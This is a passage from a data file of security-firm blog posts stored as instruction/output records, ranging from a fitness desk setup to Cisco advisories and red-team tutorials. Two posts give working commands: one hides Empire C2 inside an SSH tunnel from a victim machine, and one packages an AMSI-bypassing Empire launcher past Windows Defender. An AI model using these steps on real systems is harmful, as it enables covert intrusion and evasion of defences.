too polite or \u201chelpful\u201d can be incredibly harmful when it comes to physical security.\n\nA review of what was done right and wrong in this situation:\n\nThe Good:\n\nThis did not seem like the kind of hospital that expected any kind of visitors, and at the start, they seemed to have the right kind of fail-safes:\n\nEntering through the only obvious entrance to the building required visitors to interact with the security guard at reception\n\nRequired to know who you were visiting, and what floor they were on\n\nRequired to sign in at the front desk\n\nUnable to enter \u201chigh risk\u201d floors without a badge\n\nEmployees knowing that badges were distributed at reception and (initially) not using their own badge to get me where I wanted to go\n\nThe Bad:\n\nOn the other hand\u2026\n\nI was allowed to sign by scribbling some unintelligible Japanese on a sticky note\n\nI was not required to produce any ID\n\nI was allowed to enter without having a clear destination\n\nThere were no controls on the elevator preventing me from navigating to restricted floors\n\nWhen entering restricted areas, employees ignored me or opened locked doors for me\n\nWhat could have been done better:\n\nDespite all of these controls, I was able to enter a locked area of the building by just walking around and looking confused. What could have stopped me from getting as far as I did? A few closing thoughts (from someone who has admittedly never worked in healthcare):\n\nReception could have sent a coworker to ask around about the existence of my friend\n\nReception could have tried harder to find my friend in their system instead of giving up when he didn\u2019t know how to spell it\n\nMy name could have been somewhere in their system; my friend informed me the hospital needed her to provide an emergency contact. If my name wasn\u2019t in the system I shouldn\u2019t have been allowed past reception.\n\nThe nurse on floor 9 could have escorted me down to the reception desk on the first floor\n\nThe nurse on floor 9 could have called reception to make sure they knew I was in the building\n\nThe nurse on floor 8 could have asked me to get a badge from reception instead of letting me in through the locked area\n\nOr could have found someone to escort me downstairs\n\n(P.S. I found my friend on floor 8!)\n\n*For anyone who\u2019s ever been a physical pentester, these things often cross our minds. We see the world in a slightly different way, no matter how \u201cordinary\u201d these things seem to others.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Healthy Hacking with the Treadmill Elliptical Desk: My journey to staying healthy while hacking!\"\nTaxonomies: \"How-To, Informational, Healthy, Healthy Hacking, Tips and Tricks, Treadmill\"\nCreation Date: \"Thu, 06 Dec 2018 19:46:09 +0000\"\nCarrie Roberts*//\n\nI\u2019m a red teamer, I love my job but I spend way too much time at a desk in front of a computer. This year I wanted to find a way to continue spending a lot of time at the computer without letting my physical health decline. This article will describe my journey to a solution that I love. It involves a combination of a treadmill desk and an under desk elliptical machine with some extra magic thrown in. The result is an awesome setup that allows me to stay fit while doing what I love \u2013 legally hacking computers and networks. \n\nThe Treadmill\n\nMy first thought was to get a treadmill desk. I knew that I wouldn\u2019t be up for walking all day but I wanted to be able to walk at least 4 miles a day while still working. I looked into desks that could adjust to both standing and sitting positions but I didn\u2019t like any of them. They were too small to accommodate all the screens and hardware I wanted on my desk. I ended up building my own fixed desk at standing height. You\u2019ll see my efforts at solving the sitting problem later.\n\nI already had a treadmill, so I just cut the arms off of it and mounted the control center to the side of the desk. I can very comfortably walk at the 1.5 mph setting while typing and moving the mouse precisely. I can push that up to 2 mph if I\u2019m willing to be a little wiggly with my mouse control. Of course, if you have meetings where you aren\u2019t trying to type you can go normal walking speeds and really rack up the miles. My goal is to walk 4 miles per day and this has worked well. At one point I started competing with my husband and was walking up to 15 miles per day! We have since calmed down and keep it to a reasonable number of miles per day.\n\nI keep my treadmill at the maximum incline setting while I walk. I figure this is just extra calories burned and consider it a bonus. In fact, for every mile I walk I gain 504 feet in elevation. That\u2019s over 50 flights of stairs every mile! I love knowing I\u2019m getting that extra bit of workout in even though I\u2019m walking slow.\n\nThe video below shows the desk in action. It starts out at speed 1 and then I increase it to speed 2. I like to work somewhere in-between those two speeds usually.\n\nAwesome, now that\u2019s multi-tasking!\n\nThe Chair\n\nNow sometimes you just want to sit down, right? Right! My first attempt at solving this problem was a bar stool. But it really wasn\u2019t very comfortable.  The stool was at an angle and didn\u2019t have a foot rest or a back rest.\n\nSo I ordered a special stool and built a little platform to give the stool a level surface to sit on. \n\nThis was a better, but not that great over all. I could sit for about 30 minutes before I had a leg going numb. Besides that, it was a little dangerous. I accidently bumped the start button a couple times and was launched off the back of the treadmill while perched atop the stool!\n\nMy husband had come up with a solution where he built a wooden deck that he could rotate down over the treadmill as a platform for an office chair when he didn\u2019t want to walk. He would then lift his office chair onto the deck when he wanted to sit. I didn\u2019t love this idea because I didn\u2019t want to lift an office chair multiple times a day. Instead, I asked him to make me a deck on wheels and here it is!\n\nThe deck has fixed (non-swivel) wheels on the bottom and pushes forward and back very easily, even with the office chair on top. \n\nThere is a wooden border around the top edge to keep me from rolling my office chair off the deck. It works perfectly, and I don\u2019t dread the transition from walking to sitting.\n\nSomething to keep in mind is that my head is 3 inches from the ceiling when I stand on the deck. Don\u2019t turn that ceiling fan on! If you are taller, you might have to watch your head when climbing into your office chair.\n\nI love this solution. You never realize how good it feels to sit in an office chair until you\u2019ve sat on a stool for 7 months!\n\nThe Elliptical\n\nAfter I started sitting down, I began feeling bad about not exercising. To solve this problem, I decided to purchase an under desk elliptical machine. It took some creativity to figure out how to mount it so it would be out of the way for walking and rolling the deck in. This is what I came up with and I like it.\n\nThe pedals rotate out of the way for rolling the deck in and out.\n\nOnce I roll the deck up and sit in the chair, I can lower the pedals with my feet and start exercising as shown in the video below.\n\nThere is a tension adjuster you can set for how hard you want your workout to be. Unfortunately, if you have too much resistance, the pedaling can cause your chair to push back. This is a bit of a nuisance and I had to install \u201cseat belts\u201d to deal with this issue. I use little bungees mounted to my desk to hold on to the arms of my office chair to keep me from rolling away while pedaling.\n\nThe elliptical comes with a display that can sit on your desk to monitor your progress. I like that. It makes me feel like I\u2019m getting something done and I can compare my workout to previous days. The cord it comes with is not very long but it is a basic aux cord like you use for head phones so a headphone extender cable will get you where you need to go.\n\nWith my treadmill desk and a comfortable \u201csitting while exercising\u201d option - I\u2019m in heaven. However, I did discover one more ergonomic issue I had to deal with.\n\nI woke up one night with my right arm completely numb. I had been sleeping on my back and hadn\u2019t even been laying on it. I was pretty sure that it was the left arm that goes numb during a heart attack so I woke my arm back up and went to sleep. Then I woke up again to an ache in my shoulder ball joint and a numb arm again. A little Googling and a call to the physical therapist and I knew that I was spending too much time crunched forward over a keyboard. I needed to start strengthening my back/shoulder muscles to help me keep better posture.\n\nThe Exercise Band\n\nTo help with strengthening my shoulder blade muscles (or whatever it\u2019s called) I installed an exercise band. I keep a timer going that reminds me to do 10 reps with the exercise band on a regular basis.\n\nYeah, no more shoulder pain with numbness in my arms!\n\nOther Features\n\nIt\u2019s amazing what just a little bit of exercise does to your body temperature. You may have noticed the fan off to the side. I have a remote control fan with varying speeds which I use often to cool down while walking. I originally had another fan that wasn\u2019t remote controlled but it was really annoying to have to reach around to turn it on and off or adjust it. Adjustments are required often because when you stop walking and are a little sweaty you quickly get too cold.\n\nI\u2019ve also got a ceiling fan/light combination with a remote control and the remote is mounted underneath my desk. This is handy, because heaven forbid I might have to leave my desk!\n\nAnother thing I love about my desk is the 12 outlet power strip I have mounted under my desk as well as the cord trays to keep all those wires organized and off the floor.\n\nI\u2019m a leg crosser. I like to cross my legs when I sit and it annoys me when I can\u2019t. I know, I\u2019m so picky right?! For my desk, I made sure there were no supports holding up the desktop where my legs would hit. The image below shows how the desktop is only \u00be of an inch thick where my legs go and the 2x4 supports skirt around this area to avoid being in the way.\n\nLastly, I\u2019m an addict to screen real-estate. I have two wide screen monitors but if I put them side by side my neck gets sore from looking to the side. I was able to find an adjustable monitor mount that worked to mount my monitors, one above the other. The lower one is at an angle so I am looking at it straight on while standing. I prefer two monitors over one large monitor because I like how the physical boundary lets me have my virtual machines in full screen mode while still only taking up half my screen real estate.\n\nWell that\u2019s it. I hope you\u2019ve enjoyed your virtual tour of my desk. I\u2019ve included links to various items I\u2019ve ordered for my desk in case you are interested.\n\nFitDesk Elliptical\n\nRemote Controlled Fan\n\n12 Outlet Power Strip\n\nCable Management Trays\n\nDouble Monitor Mount\n\n*We always appreciate when Carrie sends us a guest blog! Find her on twitter here!\n\nCheck out a related blog of Carrie\u2019s: Got Enough Monitors?\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Cisco Smart Install Escalation and Update!\"\nTaxonomies: \"Author, Blue Team, Jordan Drysdale, Red Team, BlueTeam, Cisco, External Pentest, internal pentest, Inventory, Jordan Drysdale, Nessus, RedTeam, SIET\"\nCreation Date: \"Fri, 21 Dec 2018 19:34:18 +0000\"\nJordan Drysdale//\n\ntl;dr\n\nBoth Cisco and Nessus have escalated the Smart Install Client Service feature/vulnerability.\n\nNessus is now reporting the Smart Install RCE as critical. High five!!!\n\nCisco has also packaged up a couple of associated bugs, one of which requires a firmware update. The first is seen below: \n\nReference to this advisory is listed here:\n\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2\n\nAnd, the latest update posted on 7-December-2018 lists the service as potentially dangerous and that the best practices configuration would not leave this service \u201clying around\u201d for someone to stumble upon.\n\nWhile the screenshot and text as seen above suck, the point is well received. The problem? It appears that based on the reference material, you will need a SmartNet or equivalent contract to get your hands on the updated software/firmware/IOS.\n\nReference: \n\nhttps://quickview.cloudapps.cisco.com/quickview/bug/CSCvd36820\n\nGood luck and happy patching!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"SSHazam: Hide Your C2 Inside of SSH\"\nTaxonomies: \"How-To, Informational, C2, command and control, PowerShell Empire, SSH, SSHazam\"\nCreation Date: \"Tue, 08 Jan 2019 16:04:28 +0000\"\nCarrie Roberts //*\n\nSSHazam is a method of running any C2 tool of your choice inside a standard SSH tunnel to avoid network detections. The examples here involve running PowerShell Empire, which connects to a localhost port on the victim. The local port is forwarded to the remote Empire server through an SSH connection so that the only network traffic seen is SSH. The victim system in this example is OS X but the same technique could be done on Windows using Plink.exe, part of the Putty toolset.\n\nThe image above shows the victim system has an SSH Tunnel configured to listen on port 5430 and forwards anything it receives to the Empire Server. The Empire Server has Empire running and listening on the same port on its own localhost (127.0.0.1:5430). To make the SSH traffic blend in a little more, we have the SSH server listening on port 443 instead of the standard port 22. Remember to edit your SSH config file to have it listen on this port and also edit your cloud provider firewall to let traffic on this port through.\n\nYou must create or copy a private key to your victim system before establishing the tunnel. The associated public key must be added to the authorized_keys file of your empire-server to allow the SSH connection. In this example, we have put the private key file on the victim machine at ~/.ssh/.do.key. The following steps will do this for you from the command line, assuming you edit it to include your whole private key:\n\nmkdir ~/.ssh\nchmod 700 ~/.ssh\necho -----BEGIN RSA PRIVATE KEY----- >> ~/.ssh/.do.key\necho MIIJKAIBAAKCAgEArVuMJdwgl9z9s1C0mrYV05hwUevmY+CkJaY/1iiPJSE6/AAp >> ~/.ssh/.do.key\necho +qkMZ9nrHkBQtaQMrXPW5MQXLxU/o8LQ5QyPiy/B4FiGEfNSx//mSJvEYAXXN4zC >> ~/.ssh/.do.key\n\necho RkiQ5Eir83CLCZFLRWV8wFvNkGV2krxMXDtHHFL5ars/J7tdBekmYI62eXnE5oXl >> ~/.ssh/.do.key\necho NHky2x6YsnQf5lOkC1XyWvwg77gR2kRhb9KpOi+hp6xB42o00mpbZgyY5V4= >> ~/.ssh/.do.key\necho -----END RSA PRIVATE KEY----- >> ~/.ssh/.do.key\nchmod 600 ~/.ssh/.do.key\n\nTo prevent anyone who gains access to the private key from doing unwanted things to your empire-server, you can make a configuration change on the Empire Server.  Specifically, edit /etc/passwd and change the login to /bin/false.\n\nvictim:x:1001:1001:Victim Guy,,,:/home/victim:/bin/false\n\nWith the private key in place on the victim system, one simple command will configure the SSH Tunnel and ports for you.\n\nssh -i ~/.ssh/.do.key  -p 443 -N -f -oStrictHostKeyChecking=no victim@empire-server.corp.com -L 5430:127.0.0.1:5430\n\nNow, you configure PowerShell Empire, or your own C2, to listen for connections on 127.0.0.1:5430. This even works when you are doing complex configurations like domain fronting. \n\nThat\u2019s it, all of your C2 traffic is hidden inside of an encrypted SSH tunnel and you don\u2019t have to worry about any other network signatures your C2 may trigger.\n\nBonus Material\n\nThat technique is cool, simple, and may get you a C2 session in cases where you would otherwise get caught. But you may not want to put customer sensitive data on a cloud host you don\u2019t own. In this case, you\u2019ll want to set up additional redirectors to forward traffic through the cloud host to the system you own inside your own network. This is twice as complex but have no fear, I\u2019ve got it all figured out for you as shown below.\n\nThe C2 connection gets forwarded through the SSH Tunnel to the empire-redirector. Firewall rules on the empire-redirector forward the traffic along to another intermediary redirector. Lastly, your in-house system, where the Empire C2 session will ultimately land, establishes a reverse SSH connection out to the final redirector.\n\nThe SSH command to run on the victim machine is as follows:\n\nssh -i ~/.ssh/.do.key  -p 443 -N -f -oStrictHostKeyChecking=no victim@empire-redirector.corp.com -L 5430:127.0.0.1:5431\n\nThe SSH command to run from your in-house trusted system is: \n\nautossh -M 5431 -o ServerAliveInterval=30 -R 5433:10.10.10.185:5430 root@redirector.corp.com\n\nYou may need to install autossh first, but it is worth it because it will do the work of making sure your tunnel stays up over long periods of time.\n\nThe IP Table Rules for the Empire-Redirector are as follows:\n\niptables -t nat -A OUTPUT -m addrtype --src-type LOCAL --dst-type LOCAL -p tcp -m multiport --dports 5430:65535 -j DNAT --to-destination 128.62.137.184:5432\niptables -t nat -A POSTROUTING -m addrtype --src-type LOCAL --dst-type UNICAST -j MASQUERADE\nsysctl -w net.ipv4.conf.all.route_localnet=1\n\nThis forwards ports 5430 through 65535 on to the final redirector, so you can dedicate one port in that range to each victim.\n\nThe IP Table Rules for the Redirector are as follows:\n\nsysctl -w net.ipv4.conf.all.route_localnet=1iptables -t nat -I PREROUTING -p tcp --dport 5432 -j DNAT --to 127.0.0.1:5433\n\nWhew! What a work out. It\u2019s complex but it does what is required to take those extra steps of precaution, keeping sensitive data out of the cloud.\n\nAs a side note, I wanted to get a notification via Slack when an SSH connection was made. I added these two lines to my /etc/pam.d/sshd file on the empire-redirector to run my Slack notification script each time a successful SSH connection was made.\n\nsession [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so open\nsession optional pam_exec.so /home/root/ssh-slack-alert.sh\n\nMy Slack alert script looked like this:\n\n#!/usr/bin/env bash\n\nif [ \"$PAM_USER\" != \"admin\" ] && [ $PAM_TYPE != \"close_session\" ]\nthen\nmessage=\"\\`\\`\\`PamType: $PAM_TYPE\\nSSH-User: $PAM_USER\\nRhost: $PAM_RHOST\\nServer: SSHazam\\nHostname: `hostname`\\`\\`\\`\"\n \ncurl -X POST \\\n  --data-urlencode \"payload={\\\"channel\\\": \\\"alerts\\\", \\\"username\\\": \\\"SSHazam\\\", \\\"text\\\": \\\"${message}\\\", \\\"icon_emoji\\\": \\\":boom:\\\"}\" \\\n https://hooks.slack.com/services/YOUR/SLACK/HOOKHERE\nfi\n\nNote that in this more complex scenario, only one victim can connect at a time unless each of your victims is configured to use a different port on the empire-redirector and a different user/private-key combination. This is annoying, but works well in a spear-phishing scenario.\n\n*We love when Carrie guest posts for us! Follow her on Twitter @OrOneEqualsOne\n\nFor Penetration Testing, Security Assessments, Red Team Engagements, and Threat Hunting: Contact Us!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Small and Medium Business Security Strategies: Part 5\"\nTaxonomies: \"Author, Blue Team, How-To, Informational, InfoSec 101, Jordan Drysdale, Blue Team, Defensive Strategies, Jordan Drysdale, Security Strategies, Small Business, Small Business Security\"\nCreation Date: \"Thu, 17 Jan 2019 18:05:30 +0000\"\nJordan Drysdale//\n\ntl;dr\n\nInventory management and personnel management are critical to making this work. Often, the difference between your company becoming a statistic and catching someone with a foothold in your network is limiting the privilege of users on your systems. If my first check after infecting your systems is whether or not I am a local administrator is successful, you are likely hosed.\n\nIf you're just joining this series, you can view previous posts here: Part 1: IntroductionPart 2: InventoryPart 3: Inventory, softwarePart 4: Vulnerability Management\n\nCSC #4 - Controlled Use of Admin Privileges\n\nPutting together the small network management puzzle will require some outside resources, assistance, help, guidance, a bit of luck, and potentially more. We have discussed the Managed IT Provider (MSP/MSSP) roles and how those can aid, and I stick to it here. A sound MSSP can take a significant burden off your shoulders. \n\nBut, for this checkbox (Controlled Admin Privilege), we need to limit administrative privilege on the network. On many large networks, the control processes, documentation, user validation, and privileged group membership monitoring is just part of day to day operations. That said, as the owner/operator of a small business, limiting user privileges is something that must be part of employee orientation, ongoing education, and culture. It is your responsibility to tell your employees why they do not actually need administrative privilege on your company\u2019s systems. \n\nLet\u2019s describe this in terms of risk, using the onion analogy. Every layer of the onion is a risk. Someone sitting at their desk in your office is the outside layer, which is easily peeled. Once an email link is clicked, or credentials are submitted somewhere they shouldn\u2019t be, the next layer of the onion is your endpoint controls. Antivirus, application whitelisting, and monitoring are the next layers of the onion that have to be peeled back. As has been demonstrated over and over, these are just layers to be peeled back like the rest. The next layer, whether or not the user who just clicked to download that \u201cDiscount Coupon\u201d application is an administrator could be the difference between the nightmare scenario of domain compromise or an isolated incident. \n\nThe following image demonstrates the onion from the opposite perspective, each layer being your defensible position.\n\nFine, no users are members of the local administrators group. How then do we manage software installs? Hopefully, your MSSP has a ticketing system and this is something they can do remotely. First, this provides an opportunity for checks and balances. If your process requires executive or manager approval, that should happen first. Second, your MSSP or internal IT admin will install the software. Last, please gently remind your MSSP not to leave their accounts lying around as locked sessions. These sessions are the targets of hackers and pentesters alike. If there is a path to these systems, they will be pillaged for all they are worth, which likely includes the credentials for a highly privileged account.\n\nPassword management ties into about every CSC / NIST standard that is defined in some way. Managing the privileged account passwords, switches, access points, routers, domain administrators also require some thought. The following is a list of password managers that can help employees adhere to password policies without resorting to sticky notes. Many of them allow the creation and delegation of privileges, which can also be revoked at a moment\u2019s notice. \n\nLastPassKeeperZohoSecretServer\n\nAll these still require some form of authentication, so please take extreme caution when managing the \u201cOne Password To Rule Them All,\u201d and enable two-factor authentication!\n\nAlong with managing the user privileges on your network\u2019s workstations, be sure groups like \u201cDomain Administrators\u201d, \u201cEnterprise Admins\u201d, and \u201cSchema Admins\u201d are well managed and that the members of these groups have been vetted and belong there. Another part of policy and procedure implementation is an annual audit and review of those policies.\n\nNetworks do not operate themselves and while they are often neglected, they should not be. Make your network, the associated policies and procedures, and your business more secure by playing the governing role.\n\nAs always, if you want to see or hear more, drop us a line - consulting@blackhillsinfosec.com. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"I Spy with InSpy v3.0\"\nTaxonomies: \"How-To, Password Spray, Recon, Red Team, Red Team Tools, InSpy, password spraying, recon, recon tool, red team tools\"\nCreation Date: \"Mon, 28 Jan 2019 16:34:35 +0000\"\nDarin Roberts//\n\nEarly in 2018 I wrote a blog about InSpy. InSpy is a great reconnaissance tool that gathers usernames from LinkedIn. My first blog can be found here.\n\nA few months ago, a co-worker mentioned to me that InSpy was now requiring an API key. I found out that the updated version did in fact require an API key. The version that I initially used was 2.0.2 and the updated version is 3.0.1. Up until the other day, I have just used the old version of InSpy on my engagements. It has been working and I haven\u2019t had any problems. Figuring out the latest version has been on my ToDo list, and I finally got to it.\n\nMy initial reaction to this was incredulity. Why break something that was working? I figured that someone was trying to capitalize on a great product, trying to get some money from writing a very effective script. However, upon further review, I shouldn\u2019t have been so negative. The changes made are awesome, and I was completely wrong.\n\nFirst, let\u2019s go through the requirements. It turns out that the only change to use InSpy is that you need a HunterIO API key. HunterIO is another tool that I use on just about every engagement. It has great recon information, and almost always finds the email pattern for a given company as well as returning multiple email addresses. Using HunterIO does require a login, but I only use the \u201cFree\u201d version, so my access does not require me to pay any money. There are benefits to paying for their service, but I haven\u2019t done so yet.\n\nThe only thing that you need to do to sign in with hunter.io is an email address.\n\nOnce you are logged in, you can get access to your API key. \n\nNow that we have the API key, let\u2019s see what we need to do with it. On the instructions with InSpy, it says we need to put the API key on line 29 of the script. Open up the script with your favorite text editor in Linux and find line 29. It looks something like this.\n\nPut the API key in between the quotes and save the script.\n\nRunning the script is a little different between version 2 and version 3. The following is the command used for employees of Black Hills using version 2.0.2.\n\nThe following is the script and output from version 3.0.1.\n\nThe CSV output is very similar. However, on the output from version 3, there is a third column that contains the email addresses. Again, this is a handy feature.\n\nI really like the updates to InSpy. I was wary at first, but after taking the time to input my already available API key, InSpy is more useful than before. If you have been using the older version, it is definitely worth the update!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting PowerShell Empire Past Windows Defender\"\nTaxonomies: \"C2, How-To, Informational, Red Team, Red Team Tools, .Net, Carrie Roberts, PowerShell, PowerShell Empire, Red Team, Windows 10, Windows Defender\"\nCreation Date: \"Fri, 15 Feb 2019 22:03:09 +0000\"\nCarrie Roberts //* (Updated 2/12/2020)\n\nADVISORY: The techniques and tools referenced within this blog post may be outdated and do not apply to current situations. However, there is still potential for this blog entry to be used as an opportunity to learn and to possibly update or integrate into modern tools and techniques. \n\nNote: Windows Defender added a detection on 2/25/2019 which now detects this method as \"AmsiTamper.A\"\n\nWindows Defender does a good job of blocking many attacks, including attempts to establish Command & Control (C2) sessions with published tools like PowerShell Empire. I was recently looking for a way to establish such a C2 session on a Windows 10 computer with Windows Defender enabled. I found a project called SharpSploit by Ryan Cobb that did the trick. SharpSploit combines a lot of other important work by other security researchers into one tool and creates a C2 session with C# code instead of using PowerShell.exe. This technique helps to avoid some common detections around malicious PowerShell activity.\n\nOf particular interest to our goal at hand is the PowerShellExecute method described in the SharpSploit Quick Command Reference.\n\nCool! It uses Matt Graeber\u2019s (@mattifestation) AMSI bypass and Lee Christensen\u2019s (@tifkin_) PowerShell logging bypass too. That\u2019s handy! The key piece here for bypassing Windows Defender with our payload is the AMSI bypass.\n\nNow to get started getting that PowerShell Empire payload past Anti-Virus solutions like Windows Defender.\n\nWe are going to use SharpGen, also developed by Ryan Cobb, as a way to package up the SharpSploit functionality we want inside of an executable file. Before building this executable, you will need to install the .NET Core SDK which you can find here.\n\nWindows Defender does not get a warm and cozy feeling about the files in the SharpGen github repo. If you are crafting your C2 on a system with Windows Defender, you should add a folder to the exceptions list in the Windows Defender settings. From within this folder, you can work with the SharpGen code without interference. Now, pull down the SharpGen code from github (into the folder you added to Windows Defender's exceptions list). You can use Git For Windows to run this command:\n\ngit clone https://github.com/cobbr/SharpGen.git\n\nBy default, SharpGen bundles PowerKatz into the final executable, which will still get blocked by Windows Defender. Since our goal is not to run Mimikatz, we will disable it by editing the resources.yml in the SharpGen/Resources, and changing the enabled field for all PowerKatz related entries to false:\n\nAfter ensuring that each \u201cEnabled\u201d field is set to false in the resources.yml file, we are ready to build the SharpGen DLL.\n\ncd SharpGen\n\nThe following produces a bin/Release/netcoreapp2.1 directory with the SharpGen.dll file we need for the next step. \n\ndotnet build -c Release\n\nFor a simple example, we will first build an executable that prints \u201chi\u201d to the screen using \u201cWrite-Output\u201d\n\ndotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe -d net40 \"Console.WriteLine(Shell.PowerShellExecute(\\\"Write-Output hi\\\"));\"\n\nYou will now find the executable to run on your victim system in the Output folder. The \u201c-d net40\u201d option in the command above targets .Net 4.0. Then you can change this to \u201c-d net35\u201d to target .Net 3.5 if this is what your victim system is running.\n\nRunning our example.exe will simply print \u201chi\u201d to the screen. If you run the executable by clicking on it, this will happen so fast you won\u2019t even see it. I recommend you run the executable from cmd.exe as shown below so you can see the output.\n\nOur initial goal can be accomplished by building an executable that will run a PowerShell one-liner to establish a C2 connection with Empire. We generate the one-liner using the multi/launcher stager in PowerShell Empire (some hints on how to do that here). All we need is the resulting base64 string to copy and paste into the following command.\n\ndotnet bin/Release/netcoreapp2.1/SharpGen.dll -f Launcher.exe -d net40 \"Console.WriteLine(Shell.PowerShellExecute(\\\"$c = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('')); invoke-expression -command $c\\\"));\"\n\nReplace with the base64 string output produced by Empire\u2019s multi/launcher (the stuff after \u201cpowershell -noP -sta -w 1 -enc\u201d, including any equals signs at the end).\n\nYou will find Launcher.exe in the Output directory. Move this to your victim system and voila! You have gotten past Windows Defender. \n\nHowever, in a corporate environment, this is probably not the only defense you need to get past. For example, there may be network defenses that will inspect the network traffic and shutdown the communication. Here are some tips for success.\n\nUse HTTPS communications over port 443, using valid (not self-signed) certificates. More information on how to set this up with Empire is located here.\n\nChange any default values (like DefaultJitter and DefaultProfile) when starting your Empire Listener.\n\nUse an aged (not recently purchased) and categorized domain. In fact, if you use a domain that is categorized as Government, Health Care or Financial you might even avoid getting your traffic decrypted and inspected. Detect-SSLmitm is a PowerShell script that you can run on the victim system to determine which websites are being SSL decrypted. If you find that sites categorized as financial are not being decrypted, use a domain from that category. You can buy a domain, host some believable pages on it, and apply for categorization (time-consuming). Or, you can buy a domain that has already been categorized but is now available for purchase. A tool like Domain Hunter, Joe Vest (@joevest) & Andrew Chiles (@andrewchiles), can help you locate such a domain.\n\nIf application whitelisting is in play and preventing you from running random executables, try one of many application whitelisting bypasses. Here is one example by @fullmetalcache that I\u2019ve used successfully in the past.\n\n-- Thanks to Carrie for another awesome guest blog post here on the BHIS Blog! \n\nFor Penetration Testing, Security Assessments, Red Team Engagements, and Threat Hunting: Contact Us!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"I'm Resigning From SANS\"\nTaxonomies: \"Author, Informational, John Strand, john strand, SANS, SEC504\"\nCreation Date: \"Wed, 20 Feb 2019 14:08:22 +0000\"\n\nNot sure what am I doing here with my hands?\n\nJohn Strand//\n\nHello all,\n\nWell, this is a painful post to write, so I will get right to it. I am on my last run of classes with the SANS Institute. \n\nAnd, this is a good thing. It is a good thing for SANS SEC504, it is a good thing for me, my family, and my company. The management of SANS, Ed, and I have been talking about me moving on for about a year.\n\nBut first, let me backup a bit. I started teaching for SANS a long, long time ago. I think it was about 15 years, with the mentor program. I worked myself up through the ranks working under amazing people like Scott Weil, Stephen Northcutt, Mike Poor, and Ed Skoudis. I was strongly encouraged by all of them to do something outside of SANS. In fact, Stephen once came up to me and said if he ever heard that I was \u201conly teaching for SANS,\u201d I would be fired immediately. His point was that he wanted people who were active in the fields they were teaching. I took that to heart. So, I started BHIS and started building a team. All the while trying my best to emulate Ed Skoudis and Mike Poor when they founded InGuardians. This\u2026. worked very well.\n\nThen, a few years back, Chris Brenton, Paul, and I started Active Countermeasures. That is starting to take off as well.\n\nBasically, it has gotten to the point that I need to be able to spend more time with my family and the companies we have started. \n\nDoes this mean I am done with SANS? No, not even close. I am going to shepherd SANS SEC504 through this process to another author and I will continue to present at SANS through webcasts. \n\nDoes this mean I am done teaching? No, not even close. I will continue to do webcasts with SANS and BHIS far into the future. Also, I will continue to teach Active Defense and Cyber Deception at Black Hat.\n\nhttps://www.blackhat.com/us-19/training/schedule/index.html#a-guide-to-active-defense-cyber-deception-and-hacking-back-14124\n\nWill I never get a chance to see you in SEC504? Depends... below is a list of the final classes I will teach for SEC504:\n\nhttps://www.sans.org/instructors/john-strand\n\nAnd it should also be noted that Josh Wright will be taking over SEC504!! Which is great news for everyone.\n\nCheck him out here:\n\nhttps://twitter.com/joswr1ght\n\nI would also like to take a moment to point out that part of the timing of this is because the SEC504 instructor corps is very, very strong. The people teaching SEC504 right now are the strongest group of instructors I have ever seen. It makes stepping away that much easier when you know that things will go on without you. The list of upcoming SEC504 classes can be found on the following link, and all of the instructors teaching are amazing.\n\nhttps://www.sans.org/course/hacker-techniques-exploits-incident-handling\n\nI also wanted to write this as an official and public thanks to the entirety of SANS. All of the instructors, the management, and the staff have helped me become the security professional I am today. For that, I am grateful.\n\nAs for the students; everything I have done, and continue to do is to help ensure that SANS SEC504 is the greatest class you have ever taken, not just in the classroom, but through the presentations, blogs, and webcasts as well. \n\nThanks,\n\nJohn Strand\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The RDP Through SSH Encyclopedia\"\nTaxonomies: \"External/Internal, How-To, Informational, Red Team, BHIS, Black Hills Information Security, Carrie Roberts, RDP, SSH\"\nCreation Date: \"Thu, 28 Feb 2019 16:20:19 +0000\"\nCarrie Roberts //*\n\nI have needed to remind myself how to set up RDP access through an SSH connection so many times that I\u2019ve decided to document it here for future reference. I hope it proves useful to you as well. I do \u201cadversary simulation\u201d for work and so I present this information using terms like \u201cattacker\u201d and \u201ctarget\u201d but this info is also useful for performing system administration tasks.\n\nThe first scenario we will cover is the situation where you have access to a Linux machine on an Internal network and you want to RDP to a Windows machine on that same internal network. This might be the case if you have placed a Dropbox on the internal network (e.g. a Raspberry Pi computer plugged into an ethernet port on the internal network). Or, perhaps you have access to execute commands on a Linux machine that already exists on the Internal Network. In either case, you can use the following technique to RDP to your target on the Internal Network. The following diagram shows the starting point for this scenario.\n\nHere we have the Attacker system on one Internal network that is not accessible from the internet. The attacker operating system is Windows. Next, we have a Linux computer on the internet (e.g. a Digital Ocean Droplet). We refer to this system on the Internet as the External system. The External system has an IP address of 208.8.8.8 in this example, and it has the SSH service listening on port 443. The red box on the outside of the gray box indicates that the port, port 443, is listening on the external interface. Listening on the external interface means that other remote systems can connect to it. The red box is shown twice just for clarity in later connection steps but there is really only one port 443 listening. We, the Attacker, have full control of both the Attacker and External machines.\n\nMoving to the Target Internal network we have a Dropbox (Linux) where we have the ability to execute commands. The Dropbox has the SSH service listening on port 22, allowing other systems on the network to interact with it. Lastly, we have the Target Windows system that we want to RDP to. The Target has RDP enabled and listening on port 3389 and we have credentials for a user that is allowed to RDP to this machine. The IP address of the Target is 10.2.2.222 in this example.\n\nAll SSH authentication in this tutorial will be done using public/private key pairs. It is assumed that the Dropbox has a private key file called db.key and that the public key (db.pub) has been added to the authorized_keys file on the External server. It is also assumed that the Attacker system is set up in a similar manner using a private key called at.ppk or at.key and that the public key for this is added to the authorized_keys file on both the External and Dropbox systems. You will need to use the ppk version of the private key for the examples that use PuTTY/plink as the SSH client. If your key pair was generated on Linux you can use the PuTTYgen tool to convert the private key to the ppk format.\n\nThe first step we will take is to connect the Dropbox to the External system via SSH. Because internal networks are not accessible from the Internet, the connection will have to be initiated from the Dropbox itself. 